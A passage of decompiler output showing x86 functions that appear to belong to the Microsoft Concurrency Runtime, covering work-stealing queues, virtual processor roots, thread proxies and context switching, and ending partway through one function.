__int32 __thiscall sub_480EBA(volatile __int32 *this, char a2)
{
  _DWORD *v3; // esi
  __int32 v4; // edi

  v3 = this + 28;
  sub_46FC7F(this + 28);
  v4 = sub_4810BB((int)this, a2);
  sub_46FCC0(v3);
  return v4;
}

//----- (00480EFD) --------------------------------------------------------
int __thiscall sub_480EFD(
        volatile __int32 *this,
        unsigned __int8 (__cdecl *a2)(int, int),
        int a3,
        int (__cdecl *a4)(int, int))
{
  volatile __int32 *v5; // eax
  __int32 v6; // edi
  __int32 v7; // esi
  int v8; // edx
  int v9; // eax
  char v10; // al
  volatile __int32 *v12; // [esp+10h] [ebp-1Ch]
  int v13; // [esp+18h] [ebp-14h]
  int v14; // [esp+1Ch] [ebp-10h]

  v12 = (volatile __int32 *)*((_DWORD *)this + 4);
  sub_46FC7F(v12);
  v5 = this + 1;
  v6 = *((_DWORD *)this + 1);
  v7 = v6 - 1;
  if ( v6 - 1 >= *this )
  {
    v14 = *((_DWORD *)this + 1);
    v8 = v14;
    do
    {
      v9 = *(_DWORD *)(*((_DWORD *)this + 7) + 4 * (v7 & this[2]));
      v13 = v9;
      if ( v9 )
      {
        if ( a2(v9, a3) )
        {
          v10 = a4(v13, a3);
          v8 = v14;
          if ( v10 )
          {
            if ( v14 == v6 )
              --v6;
            else
              *(_DWORD *)(*((_DWORD *)this + 7) + 4 * (v7 & this[2])) = 0;
          }
        }
        else
        {
          v8 = v14;
        }
      }
      --v7;
      v14 = --v8;
    }
    while ( v7 >= *this );
    v5 = this + 1;
  }
  _InterlockedExchange(v5, v6);
  return sub_46FCC0(v12);
}

//----- (00480FB1) --------------------------------------------------------
int __thiscall sub_480FB1(
        volatile __int32 *this,
        unsigned __int8 (__cdecl *a2)(int, int),
        int a3,
        int (__cdecl *a4)(int, int))
{
  return sub_480EFD(this + 19, a2, a3, a4);
}

//----- (00480FBD) --------------------------------------------------------
__int32 __thiscall sub_480FBD(volatile __int32 *this, char a2, _BYTE *a3)
{
  __int32 v4; // ebx

  v4 = 0;
  if ( sub_46FCD4(this + 28) )
  {
    v4 = sub_4810BB((int)this, a2);
    sub_46FCC0((_DWORD *)this + 28);
    *a3 = 1;
  }
  else
  {
    *a3 = 0;
  }
  return v4;
}

//----- (0048102D) --------------------------------------------------------
__int32 __thiscall sub_48102D(int this, char a2, int a3)
{
  int v4; // ecx
  __int32 v5; // ebx
  volatile __int32 v6; // edi

LABEL_11:
  v5 = 0;
  while ( 1 )
  {
    v6 = *(_DWORD *)this;
    _InterlockedExchange((volatile __int32 *)this, *(_DWORD *)this + 1);
    if ( v6 >= *(_DWORD *)(this + 4) )
    {
      *(_DWORD *)this = v6;
      return v5;
    }
    v4 = v6 & *(_DWORD *)(this + 8);
    if ( (*(_BYTE *)(*(_DWORD *)(this + 28) + 4 * v4) & 1) != 0
      && !a2
      && sub_47D215((_DWORD *)(*(_DWORD *)(this + 32) + 8 * v4)) )
    {
      break;
    }
    if ( *(_BYTE *)(this + 20) && *(_DWORD *)this >= *(_DWORD *)(this + 24) )
      *(_BYTE *)(this + 20) = 0;
    v5 = _InterlockedExchange((volatile __int32 *)(*(_DWORD *)(this + 28) + 4 * (v6 & *(_DWORD *)(this + 8))), 0);
    if ( v5 )
    {
      if ( (v5 & 1) == 0 )
        return v5;
      v5 &= ~1u;
      if ( sub_477F29((int *)(*(_DWORD *)(this + 32) + 8 * (v6 & *(_DWORD *)(this + 8))), 0) )
        return v5;
      goto LABEL_11;
    }
  }
  *(_DWORD *)this = v6;
  return 0;
}

//----- (004810BB) --------------------------------------------------------
__int32 __thiscall sub_4810BB(int this, char a2)
{
  __int32 result; // eax
  int *v4; // eax
  _BYTE *v5; // edi
  LPVOID v6; // eax
  int v7; // eax
  __int32 v8; // eax
  volatile signed __int32 *v9; // ecx

  if ( sub_47FB50((_DWORD *)this) )
    return 0;
  v4 = *(int **)(this + 72);
  v5 = 0;
  if ( v4 && v4[28] > 0 && !(*(unsigned __int8 (__thiscall **)(int *))(*v4 + 16))(v4) )
  {
    if ( !*(_BYTE *)(this + 96) || (v5 = (_BYTE *)sub_48102D(this + 76, a2, 1)) == 0 )
    {
      v6 = sub_475051();
      if ( v6 )
        v7 = (int)v6 + 175;
      else
        v7 = 179;
      *(_BYTE *)v7 |= 2u;
      return (__int32)v5;
    }
    goto LABEL_17;
  }
  result = sub_47D3E7((int *)this, a2);
  if ( result )
    return result;
  v8 = sub_48102D(this + 76, a2, 0);
  v5 = (_BYTE *)v8;
  if ( v8 )
  {
    v9 = *(volatile signed __int32 **)(this + 72);
    if ( !v9 || *(volatile signed __int32 **)(*(_DWORD *)(v8 + 8) + 12) != v9 )
    {
LABEL_17:
      sub_481272(v5, 1);
      return (__int32)v5;
    }
    sub_478531(v9);
    sub_481272(v5, 0);
  }
  return (__int32)v5;
}

//----- (00481177) --------------------------------------------------------
void __cdecl sub_481177(int a1)
{
  _InterlockedExchange((volatile __int32 *)(a1 + 116), 1);
  sub_477D96(a1, -999);
  sub_477E2D(a1, 0);
}

//----- (0048119E) --------------------------------------------------------
int __cdecl sub_48119E(int (__thiscall ***a1)(_DWORD, int))
{
  return (**a1)(a1, 1);
}

//----- (004811BC) --------------------------------------------------------
void __thiscall sub_4811BC(_DWORD *this, int a2)
{
  if ( (signed __int32 (__cdecl *)(int))this[3] == sub_48127F )
    sub_4811D4(this, a2);
  else
    sub_48120A((int)this, a2);
}

//----- (004811D4) --------------------------------------------------------
void __thiscall sub_4811D4(_DWORD *this, int a2)
{
  int v2; // edx
  int v3; // eax
  volatile signed __int32 *v4; // ecx

  if ( !*(_DWORD *)(a2 != 0 ? a2 - 4 + 0x34 : 52) )
  {
    v3 = this[2];
    v4 = *(volatile signed __int32 **)(v3 + 12);
    *(_DWORD *)(a2 != 0 ? a2 - 4 + 0x34 : 52) = v3;
    *(_DWORD *)(a2 != 0 ? a2 - 4 + 0x38 : 56) = v3;
    v2 = a2 != 0 ? a2 - 4 : 0;
    sub_477D09(v4, v2 != 0 ? v2 + 4 : 0, 0);
  }
}

//----- (0048120A) --------------------------------------------------------
void __thiscall sub_48120A(int this, int a2)
{
  int v2; // edx
  int v3; // edi
  int v4; // ebx
  volatile signed __int32 *v5; // eax
  volatile signed __int32 *v6; // [esp+0h] [ebp-4h]

  v2 = a2 != 0 ? a2 - 4 : 0;
  if ( !*(_DWORD *)(v2 + 0x34) )
  {
    v3 = *(_DWORD *)(this + 8);
    v4 = v2 + 4;
    v5 = *(volatile signed __int32 **)(v3 + 12);
    *(_DWORD *)(a2 != 0 ? a2 - 4 + 0x34 : 52) = v3;
    *(_DWORD *)(a2 != 0 ? a2 - 4 + 0x38 : 56) = v3;
    v6 = v5;
    if ( *(_BYTE *)(this + 17) )
    {
      *(_BYTE *)(a2 != 0 ? a2 - 4 + 0x51 : 81) = 0;
      sub_477D62(v3 + 28, (_DWORD *)(v2 + 96));
    }
    else
    {
      sub_46F085((volatile signed __int32 *)(v3 + 32));
      ++*(_DWORD *)(v3 + 48);
      sub_46F19F((volatile signed __int32 *)(v3 + 32));
      sub_477D09(v6, v4, 1);
    }
  }
}

//----- (00481272) --------------------------------------------------------
char __thiscall sub_481272(_BYTE *this, char a2)
{
  char result; // al

  result = a2;
  this[17] = a2;
  return result;
}

//----- (0048127F) --------------------------------------------------------
signed __int32 __cdecl sub_48127F(int a1)
{
  char *v1; // eax
  char *v2; // edi
  int v3; // eax
  void *v4; // edx
  volatile signed __int32 *v5; // ebx
  _DWORD *v7; // esi
  char pExceptionObject[12]; // [esp+10h] [ebp-38h] BYREF
  int v10; // [esp+1Ch] [ebp-2Ch]
  void *v11; // [esp+20h] [ebp-28h]
  _DWORD *v12; // [esp+24h] [ebp-24h]
  char *v13; // [esp+28h] [ebp-20h]
  char *v14; // [esp+2Ch] [ebp-1Ch]
  volatile signed __int32 *v15; // [esp+30h] [ebp-18h]
  _DWORD *v16; // [esp+34h] [ebp-14h]
  int v17; // [esp+44h] [ebp-4h]

  v1 = (char *)sub_475051();
  if ( v1 )
    v2 = v1 - 4;
  else
    v2 = 0;
  v14 = v2;
  v13 = v2;
  v16 = *(_DWORD **)(a1 + 8);
  v11 = (void *)v16[3];
  v12 = v2 + 4;
  sub_4811D4((_DWORD *)a1, v2 != 0 ? (unsigned int)(v2 + 4) : 0);
  v3 = sub_480C27(v16, 0);
  v4 = (void *)v3;
  v5 = 0;
  v10 = v3;
  v15 = 0;
  if ( v3 && v3 != 2 )
  {
    v5 = (volatile signed __int32 *)sub_479713(v4, (int)sub_481177, v2 != 0 ? (unsigned int)(v2 + 4) : 0, 1);
    v15 = v5;
  }
  v17 = 0;
  if ( v16[6] )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AV_Interruption_exception_details_Concurrency__);
  }
  (*(void (__cdecl **)(int))(a1 + 4))(a1);
  v17 = -1;
  v7 = v16;
  sub_47872E(v11, v2 != 0 ? (unsigned int)v12 : 0);
  if ( v5 )
  {
    sub_4793BB(v10, (int)v5);
    sub_4797C2(v5);
  }
  *((_DWORD *)v2 + 27) = -1;
  *((_DWORD *)v2 + 28) = -1;
  *((_DWORD *)v2 + 29) = 0;
  *((_DWORD *)v2 + 30) = 0;
  *((_DWORD *)v2 + 13) = 0;
  *((_DWORD *)v2 + 14) = 0;
  *(_DWORD *)(a1 + 8) = 0;
  return sub_47938D((int)v7);
}
// 478A76: using guessed type _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this);

//----- (004813E7) --------------------------------------------------------
_DWORD *__thiscall sub_4813E7(_DWORD *this, int a2, _DWORD *a3, int a4)
{
  _DWORD *result; // eax

  *this = &Concurrency::details::VirtualProcessorRoot::`vftable';
  this[1] = 0;
  sub_479DBF(this + 2, a2, a3, a4);
  *((_WORD *)this + 34) = 0;
  this[19] = 0;
  this[18] = _InterlockedIncrement(dword_4F0C70);
  result = this;
  this[9] = this;
  return result;
}
// 4C14AC: using guessed type void *Concurrency::details::VirtualProcessorRoot::`vftable';
// 4F0C70: using guessed type signed __int32 dword_4F0C70[19];

//----- (00481431) --------------------------------------------------------
_DWORD *__thiscall sub_481431(_DWORD *this, char a2)
{
  *this = &Concurrency::details::VirtualProcessorRoot::`vftable';
  this[2] = &Concurrency::details::ExecutionResource::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4C0DF4: using guessed type void *Concurrency::details::ExecutionResource::`vftable';
// 4C14AC: using guessed type void *Concurrency::details::VirtualProcessorRoot::`vftable';

//----- (0048145B) --------------------------------------------------------
int __thiscall sub_48145B(_DWORD *this)
{
  return sub_479E6B(this + 2);
}

//----- (00481463) --------------------------------------------------------
int __thiscall sub_481463(_DWORD *this)
{
  return this[13];
}

//----- (00481467) --------------------------------------------------------
int __thiscall sub_481467(_DWORD *this)
{
  return this[18];
}

//----- (0048146B) --------------------------------------------------------
int __thiscall sub_48146B(int *this, int a2)
{
  char pExceptionObject[12]; // [esp+4h] [ebp-Ch] BYREF

  if ( !a2 )
  {
    sub_46A08B(pExceptionObject, (int)"pScheduler");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( *(_DWORD *)(this[7] + 8) != a2 )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
  }
  sub_4814C3((int)this);
  return sub_47AF7A(this[7], (int)this);
}
// 46FE7D: using guessed type _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this);
// 4E4AD0: using guessed type __TI_flags _TI2_AVinvalid_operation_Concurrency__;

//----- (004814C3) --------------------------------------------------------
unsigned int __thiscall sub_4814C3(int this)
{
  unsigned int result; // eax

  result = _InterlockedDecrement((volatile signed __int32 *)(this + 76));
  if ( !result )
    return sub_4814E6((_DWORD **)this);
  return result;
}

//----- (004814D9) --------------------------------------------------------
unsigned __int32 __thiscall sub_4814D9(_DWORD **this)
{
  return sub_47B3B5(this[7], (int)(this + 2));
}

//----- (004814E6) --------------------------------------------------------
unsigned int __thiscall sub_4814E6(_DWORD **this)
{
  return sub_47AE17(this[7], (int)(this + 2));
}

//----- (004814F3) --------------------------------------------------------
_DWORD *__thiscall sub_4814F3(_DWORD *this, int a2, _DWORD *a3, int a4)
{
  _DWORD *result; // eax

  sub_4813E7(this, a2, a3, a4);
  *this = &Concurrency::details::FreeVirtualProcessorRoot::`vftable';
  result = this;
  this[20] = 0;
  this[21] = 0;
  return result;
}
// 4C14D8: using guessed type void *Concurrency::details::FreeVirtualProcessorRoot::`vftable';

//----- (00481526) --------------------------------------------------------
bool __thiscall sub_481526(_WORD *this, int a2)
{
  return *(_WORD *)(a2 + 4) == this[2] && *(_DWORD *)a2 == *(_DWORD *)this;
}

//----- (00481546) --------------------------------------------------------
_DWORD *__thiscall sub_481546(_DWORD *this, char a2)
{
  *this = &Concurrency::details::VirtualProcessorRoot::`vftable';
  this[2] = &Concurrency::details::ExecutionResource::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4C0DF4: using guessed type void *Concurrency::details::ExecutionResource::`vftable';
// 4C14AC: using guessed type void *Concurrency::details::VirtualProcessorRoot::`vftable';

//----- (00481570) --------------------------------------------------------
int __thiscall sub_481570(_DWORD *this)
{
  int result; // eax
  char v3[8]; // [esp+8h] [ebp-10h] BYREF
  int v4; // [esp+10h] [ebp-8h]
  void (*v5)(); // [esp+14h] [ebp-4h]

  v5 = sub_46FCCB;
  v4 = 0;
  while ( !this[1] )
    sub_46E3D5((int)v3);
  result = this[1];
  this[1] = 0;
  return result;
}
// 481570: using guessed type char var_10[8];

//----- (0048159F) --------------------------------------------------------
int __thiscall sub_48159F(int this, __int32 a2)
{
  __int32 v2; // edi
  int (__thiscall **v4)(void *); // esi
  int result; // eax
  char pExceptionObject[12]; // [esp+Ch] [ebp-18h] BYREF
  char v7[12]; // [esp+18h] [ebp-Ch] BYREF

  v2 = a2;
  if ( !a2 )
  {
    sub_46A08B(v7, (int)"pContext");
    _CxxThrowException(v7, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  v4 = (int (__thiscall **)(void *))(*(int (__thiscall **)(__int32))(*(_DWORD *)a2 + 8))(a2);
  if ( !v4 )
  {
    v2 = a2;
    v4 = (int (__thiscall **)(void *))(*(int (__thiscall **)(_DWORD, __int32))(**(_DWORD **)(this + 28) + 28))(
                                        *(_DWORD *)(this + 28),
                                        a2);
  }
  if ( _InterlockedIncrement((volatile signed __int32 *)(this + 76)) == 2 )
  {
    result = this + 4;
    _InterlockedExchange((volatile __int32 *)(this + 4), v2);
  }
  else
  {
    sub_4818DC((_DWORD *)this);
    if ( *(_DWORD *)(this + 80) )
    {
      if ( v4 != *(int (__thiscall ***)(void *))(this + 80) )
      {
        std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
      }
    }
    *(_DWORD *)(this + 84) = 0;
    sub_4814D9((_DWORD **)this);
    sub_481661((int (__thiscall ***)(void *))this, v4);
    return sub_481C8C((HANDLE *)v4);
  }
  return result;
}
// 46FE7D: using guessed type _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this);
// 4E4AD0: using guessed type __TI_flags _TI2_AVinvalid_operation_Concurrency__;

//----- (00481661) --------------------------------------------------------
int __thiscall sub_481661(int (__thiscall ***this)(void *), int (__thiscall **a2)(void *))
{
  int (__thiscall **v3)(void *); // ebx
  int v4; // eax

  sub_481CAE(a2);
  this[20] = a2;
  a2[4] = (int (__thiscall *)(void *))this;
  v3 = this[7];
  v4 = (**this)(this);
  return sub_4818A6((int)a2, *((_DWORD *)v3[4] + 13 * v4), *((_WORD *)v3[4] + 26 * v4 + 6), 0);
}

//----- (004816C8) --------------------------------------------------------
char __thiscall sub_4816C8(int this, int a2)
{
  int v3; // esi
  char v5[12]; // [esp+Ch] [ebp-28h] BYREF
  char pExceptionObject[12]; // [esp+18h] [ebp-1Ch] BYREF
  char v7[16]; // [esp+24h] [ebp-10h] BYREF

  if ( !a2 )
  {
    sub_46A08B(v7, (int)"pContext");
    _CxxThrowException(v7, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( !*(_DWORD *)(this + 80) )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
  }
  v3 = (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 8))(a2);
  if ( *(_DWORD *)(this + 80) != v3 )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)v5);
    _CxxThrowException(v5, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
  }
  if ( _InterlockedDecrement((volatile signed __int32 *)(this + 76)) )
  {
    sub_481570((_DWORD *)this);
  }
  else
  {
    _InterlockedExchange((volatile __int32 *)(this + 84), *(_DWORD *)(this + 80));
    sub_4814E6((_DWORD **)this);
    sub_481CD9(v3);
  }
  return 1;
}
// 46FE7D: using guessed type _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this);
// 4E4AD0: using guessed type __TI_flags _TI2_AVinvalid_operation_Concurrency__;

//----- (0048176B) --------------------------------------------------------
int __thiscall sub_48176B(_DWORD *this)
{
  unsigned int v2; // eax
  unsigned int v3; // eax

  v2 = (unsigned int)sub_46F930(*(_DWORD *)(*(_DWORD *)(this[7] + 12) + 112));
  if ( v2 && (v2 & 3) == 1 && (v3 = v2 & 0xFFFFFFFE) != 0 && v3 == this[20] )
    *(_DWORD *)(v3 + 16) = 0;
  else
    sub_4818DC(this);
  return (*(int (__thiscall **)(_DWORD *, int))(*this + 32))(this, 1);
}

//----- (004817B9) --------------------------------------------------------
_BYTE *__thiscall sub_4817B9(_DWORD *this, int a2)
{
  char v4[12]; // [esp+Ch] [ebp-24h] BYREF
  char pExceptionObject[12]; // [esp+18h] [ebp-18h] BYREF
  char v6[12]; // [esp+24h] [ebp-Ch] BYREF

  if ( !a2 )
  {
    sub_46A08B(v6, (int)"pContext");
    _CxxThrowException(v6, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( !this[20] )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
  }
  if ( this[20] != (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 8))(a2) )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)v4);
    _CxxThrowException(v4, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
  }
  return sub_471A97(*(_DWORD **)(this[7] + 12));
}
// 46FE7D: using guessed type _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this);
// 4E4AD0: using guessed type __TI_flags _TI2_AVinvalid_operation_Concurrency__;

//----- (00481839) --------------------------------------------------------
__int32 __thiscall sub_481839(int this, int a2)
{
  int v3; // edi
  __int32 result; // eax
  int v5; // ebx

  v3 = *(_DWORD *)(this + 80);
  result = _InterlockedDecrement((volatile signed __int32 *)(this + 76));
  if ( result > 0 )
  {
    v5 = sub_481570((_DWORD *)this);
    result = (*(int (__thiscall **)(int))(*(_DWORD *)v5 + 8))(v5);
    if ( v3 != result )
      return (*(int (__thiscall **)(int, int, int))(*(_DWORD *)v3 + 4))(v3, v5, a2);
  }
  else
  {
    if ( !result )
      result = sub_4814E6((_DWORD **)this);
    *(_DWORD *)(this + 80) = 0;
    if ( a2 == 1 )
      return sub_481CD9(v3);
  }
  return result;
}

//----- (004818A6) --------------------------------------------------------
int __thiscall sub_4818A6(int this, int a2, __int16 a3, int a4)
{
  int result; // eax

  if ( !sub_481526((_WORD *)(this + 48), (int)&a2) )
    sub_4701F5((DWORD_PTR *)&a2, *(void **)(this + 8));
  *(_WORD *)(this + 52) = a3;
  result = a2;
  *(_DWORD *)(this + 48) = a2;
  return result;
}

//----- (004818DC) --------------------------------------------------------
char __thiscall sub_4818DC(_DWORD *this)
{
  char result; // al
  char v3[8]; // [esp+8h] [ebp-10h] BYREF
  int v4; // [esp+10h] [ebp-8h]
  void (*v5)(); // [esp+14h] [ebp-4h]

  v5 = sub_46FCCB;
  v4 = 0;
  while ( this[20] && !this[21] )
    result = sub_46E3D5((int)v3);
  return result;
}
// 4818DC: using guessed type char var_10[8];

//----- (0048190A) --------------------------------------------------------
int __thiscall sub_48190A(_DWORD *this, int a2)
{
  this[16] = a2;
  return (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)a2 + 12))(a2, this);
}

//----- (0048192D) --------------------------------------------------------
void __fastcall sub_48192D(int a1)
{
  DWORD v2; // eax
  int v3; // esi
  void *v4; // [esp-4h] [ebp-18h]
  int v5[2]; // [esp+Ch] [ebp-8h] BYREF

  v5[1] = 0;
  v5[0] = 8;
  if ( !*(_DWORD *)(a1 + 36) )
  {
    v4 = (void *)(a1 | 1);
    v2 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 4) + 16))(*(_DWORD *)(a1 + 4));
    sub_46F93E(v2, v4);
    while ( !*(_DWORD *)(a1 + 36) )
    {
      (*(void (__thiscall **)(_DWORD, int))(**(_DWORD **)(a1 + 64) + 12))(*(_DWORD *)(a1 + 64), a1);
      (*(void (__thiscall **)(_DWORD, int *))(**(_DWORD **)(a1 + 64) + 16))(*(_DWORD *)(a1 + 64), v5);
      v3 = *(_DWORD *)(a1 + 16);
      *(_DWORD *)(a1 + 64) = 0;
      *(_DWORD *)(a1 + 16) = 0;
      sub_4819D3(a1);
      if ( v3 )
        sub_481839(v3, 1);
      else
        sub_481CD9(a1);
    }
  }
}

//----- (004819D3) --------------------------------------------------------
int __thiscall sub_4819D3(int this)
{
  *(_DWORD *)(this + 64) = 0;
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4), this);
}

//----- (004819F1) --------------------------------------------------------
__int32 __thiscall sub_4819F1(_DWORD *this, int a2)
{
  int v2; // edx
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  if ( !a2 )
    goto LABEL_8;
  v2 = this[4];
  if ( !v2 )
  {
    if ( a2 == 1 )
      return sub_481CD9((int)this);
LABEL_8:
    sub_46A08B(pExceptionObject, (int)"switchState");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( a2 == 2 )
    this[4] = 0;
  return sub_481839(v2, a2);
}

//----- (00481A42) --------------------------------------------------------
__int32 __thiscall sub_481A42(volatile __int32 *this, int a2, int a3)
{
  int v3; // edi
  volatile __int32 *v4; // ebx
  int (__thiscall ***v5)(void *); // edx
  volatile __int32 *v6; // ecx
  char pExceptionObject[12]; // [esp+Ch] [ebp-10h] BYREF
  volatile __int32 *v9; // [esp+18h] [ebp-4h]

  v9 = this;
  if ( !a2 )
  {
    sub_46A08B(pExceptionObject, (int)"pContext");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  v3 = (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 8))(a2);
  if ( !v3 )
    v3 = (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(*((_DWORD *)v9 + 4) + 28) + 28))(
           *(_DWORD *)(*((_DWORD *)v9 + 4) + 28),
           a2);
  v4 = v9;
  v5 = (int (__thiscall ***)(void *))*((_DWORD *)v9 + 4);
  v6 = v9 + 8;
  *((_DWORD *)v9 + 4) = 0;
  v9 = v6;
  if ( a3 == 1 )
    _InterlockedExchange(v6, 1);
  else
    v9 = v6;
  sub_481661(v5, (int (__thiscall **)(void *))v3);
  if ( a3 != 1 )
    return sub_481C8C((HANDLE *)v3);
  sub_46F8BA(*(HANDLE *)(v3 + 12), *((HANDLE *)v4 + 3), 0xFFFFFFFF, 1);
  return _InterlockedExchange(v9, 0);
}

//----- (00481B06) --------------------------------------------------------
int __thiscall sub_481B06(_DWORD *this, int a2, int a3)
{
  int *v3; // edi
  int v4; // eax
  int v5; // esi
  int v6; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+Ch] [ebp-14h] BYREF
  _DWORD *v10; // [esp+1Ch] [ebp-4h]

  this[1] = a2;
  this[5] = a3;
  *this = &Concurrency::details::ThreadProxy::`vftable';
  v3 = (int *)this[1];
  this[6] = 0;
  *((_BYTE *)this + 28) = 0;
  this[8] = 1;
  this[9] = 0;
  v4 = *v3;
  v10 = this;
  (*(void (__thiscall **)(int *))(v4 + 8))(v3);
  v5 = (int)v10;
  v10[10] = _InterlockedIncrement(&dword_4E81A0);
  *(_DWORD *)(v5 + 12) = sub_46F509(0);
  v6 = sub_46FAA2(
         0,
         *(_DWORD *)(v5 + 20) << 10,
         (DWORD (__stdcall *)(LPVOID))sub_481CF5,
         (void *)v5,
         0x10000u,
         (DWORD *)(v5 + 44));
  *(_DWORD *)(v5 + 8) = v6;
  if ( !v6 )
  {
    CloseHandle(*(HANDLE *)(v5 + 12));
    (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(v5 + 4) + 12))(*(_DWORD *)(v5 + 4));
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_4778D4(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVscheduler_worker_creation_error_Concurrency__);
  }
  return v5;
}
// 4C1510: using guessed type void *Concurrency::details::ThreadProxy::`vftable';
// 4E81A0: using guessed type int dword_4E81A0;
// 481B06: using guessed type _DWORD pExceptionObject[4];

//----- (00481BD9) --------------------------------------------------------
std::regex_error *__thiscall sub_481BD9(std::regex_error *this, const struct std::regex_error *a2)
{
  std::regex_error::regex_error(this, a2);
  *(_DWORD *)this = &Concurrency::scheduler_worker_creation_error::`vftable';
  return this;
}
// 46F39B: using guessed type _DWORD __thiscall std::regex_error::regex_error(std::regex_error *__hidden this, const struct std::regex_error *);
// 4C0B6C: using guessed type void *Concurrency::scheduler_worker_creation_error::`vftable';

//----- (00481BF4) --------------------------------------------------------
int __thiscall sub_481BF4(void *this)
{
  void *v3; // [esp-4h] [ebp-1Ch]

  v3 = (void *)*((_DWORD *)this + 3);
  *(_DWORD *)this = &Concurrency::details::ThreadProxy::`vftable';
  CloseHandle(v3);
  sub_46F4FB(*((HANDLE *)this + 2));
  return (*(int (__thiscall **)(_DWORD))(**((_DWORD **)this + 1) + 12))(*((_DWORD *)this + 1));
}
// 4C1510: using guessed type void *Concurrency::details::ThreadProxy::`vftable';

//----- (00481C55) --------------------------------------------------------
void *__thiscall sub_481C55(void *this, char a2)
{
  sub_481BF4(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00481C77) --------------------------------------------------------
BOOL __thiscall sub_481C77(_DWORD *this)
{
  void *v2; // [esp-4h] [ebp-4h]

  v2 = (void *)this[3];
  this[9] = 1;
  return SetEvent(v2);
}

//----- (00481C88) --------------------------------------------------------
int __thiscall sub_481C88(_DWORD *this)
{
  return this[10];
}

//----- (00481C8C) --------------------------------------------------------
BOOL __thiscall sub_481C8C(HANDLE *this)
{
  return SetEvent(this[3]);
}

//----- (00481C96) --------------------------------------------------------
BOOL __thiscall sub_481C96(_DWORD *this, int a2)
{
  void *v3; // [esp-8h] [ebp-8h]

  v3 = (void *)this[2];
  this[6] = a2;
  return sub_46F878(v3, a2);
}

//----- (00481CAE) --------------------------------------------------------
char __thiscall sub_481CAE(_DWORD *this)
{
  char result; // al
  char v3[8]; // [esp+4h] [ebp-10h] BYREF
  int v4; // [esp+Ch] [ebp-8h]
  void (*v5)(); // [esp+10h] [ebp-4h]

  if ( !this[8] )
  {
    v4 = 0;
    v5 = sub_46FCCB;
    do
      result = sub_46E3D5((int)v3);
    while ( !this[8] );
  }
  return result;
}
// 481CAE: using guessed type char var_10[8];

//----- (00481CD9) --------------------------------------------------------
__int32 __thiscall sub_481CD9(int this)
{
  volatile __int32 *v1; // esi

  v1 = (volatile __int32 *)(this + 32);
  _InterlockedExchange((volatile __int32 *)(this + 32), 1);
  WaitForSingleObjectEx(*(HANDLE *)(this + 12), 0xFFFFFFFF, 0);
  return _InterlockedExchange(v1, 0);
}

//----- (00481CF5) --------------------------------------------------------
int __stdcall sub_481CF5(int a1)
{
  WaitForSingleObjectEx(*(HANDLE *)(a1 + 12), 0xFFFFFFFF, 0);
  _InterlockedExchange((volatile __int32 *)(a1 + 32), 0);
  (*(void (__thiscall **)(int))(*(_DWORD *)a1 + 20))(a1);
  (*(void (__thiscall **)(int, int))(*(_DWORD *)a1 + 16))(a1, 1);
  sub_46FA2C(0);
  return 0;
}

//----- (00481D45) --------------------------------------------------------
int *__thiscall sub_481D45(int *this, int a2, int a3, int a4, int a5)
{
  *this = a2 & 0xFFFFFFF;
  this[1] = a4;
  this[3] = a5;
  this[2] = a3;
  return this;
}

//----- (00481D6A) --------------------------------------------------------
bool __thiscall sub_481D6A(unsigned int *this, int a2)
{
  _DWORD *v2; // esi
  int v3; // eax

  v2 = this + 4;
  v3 = sub_475B3F((int)&a2, this[4]);
  return sub_47629F(v2, &a2, v3) != 0;
}

//----- (00481D94) --------------------------------------------------------
char __thiscall sub_481D94(int this, _DWORD *a2)
{
  int v2; // eax
  int v3; // eax
  int v4; // eax
  int v6; // eax

  v2 = *a2 & 0xFFFFFFF;
  if ( !v2 )
    return 1;
